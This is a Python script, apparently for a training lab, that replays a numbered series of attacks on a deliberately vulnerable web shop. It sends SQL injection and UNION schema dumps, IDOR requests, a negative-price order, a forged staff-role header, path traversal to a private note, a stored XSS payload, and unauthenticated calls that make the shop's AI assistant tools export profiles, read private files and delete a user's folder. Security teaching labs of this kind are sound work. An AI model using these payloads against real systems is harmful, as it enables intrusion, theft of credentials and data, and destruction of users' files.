"""Воспроизведение атак на лабораторный магазин. Использование: attack.py BASE_URL"""
import json
import sys
from urllib.error import HTTPError
from urllib.request import Request, urlopen

BASE = sys.argv[1].rstrip("/")


def call(method, path, body=None, headers=None):
    req = Request(BASE + path, data=json.dumps(body).encode() if body is not None else None,
                  headers={"Content-Type": "application/json", **(headers or {})}, method=method)
    try:
        resp = urlopen(req, timeout=5)
    except HTTPError as exc:
        resp = exc
    with resp:
        text = resp.read().decode()
    try:
        return resp.status, json.loads(text)
    except ValueError:
        return resp.status, text


def login(user, pw):
    return {"X-Token": call("POST", "/login", {"username": user, "password": pw})[1]["token"]}


def show(name, result):
    status, data = result
    out = json.dumps(data, ensure_ascii=False) if not isinstance(data, str) else data
    print(f"[{name}]\n  HTTP {status}\n  {out[:400]}\n")


alice, bob = login("alice", "learn-alice"), login("bob", "learn-bob")

show("A01 SQLi /profile (все профили, без токена)", call("GET", "/profile?id=1%20OR%201=1"))
show("A02 SQLi /search UNION (схема БД)", call("GET", "/search?q=" + "x%27%20UNION%20SELECT%201,sql,3,4%20FROM%20sqlite_master--%20"))
show("A03 SQLi /assistant/context", call("GET", "/assistant/context?order_id=1%20OR%201=1", headers=alice))
show("A04 IDOR: чужой профиль id=2 с токеном alice", call("GET", "/profile?id=2", headers=alice))
show("A05 GET /orders без авторизации", call("GET", "/orders"))
show("A06 заказ chair по цене -100", call("POST", "/orders", {"product": "chair", "price": -100}, alice))
show("A07 /admin/export с X-Role: staff без сессии", call("GET", "/admin/export", headers={"X-Role": "staff"}))
show("A08 IDOR файлов: чек bob с токеном alice", call("GET", "/files?user=bob&path=receipt.txt", headers=alice))
show("A09 path traversal на private/operator-note.txt", call("GET", "/files?user=alice&path=../../private/operator-note.txt"))
show("A10 /debug/logs (пароли и токены)", call("GET", "/debug/logs"))
call("POST", "/reviews", {"product": "chair", "text": "<script>alert(1)</script>"})
show("A11 stored XSS /reviews/view (отзыв без логина)", call("GET", "/reviews/view"))
show("A12 /assistant/execute export_profiles без токена", call("POST", "/assistant/execute", {"decision": {"tool": "export_profiles"}}))
show("A13 /assistant/execute read_file private без токена", call("POST", "/assistant/execute", {"decision": {"tool": "read_file", "arguments": {"path": "private/operator-note.txt"}}}))
show("A14 утечка исключения в 500", call("POST", "/orders", {}, alice))
show("A15 /assistant/execute delete_tree без токена", call("POST", "/assistant/execute", {"decision": {"tool": "delete_tree", "arguments": {"path": "files/bob"}}}))
show("A15b чек bob после удаления", call("GET", "/files?user=bob&path=receipt.txt", headers=bob))
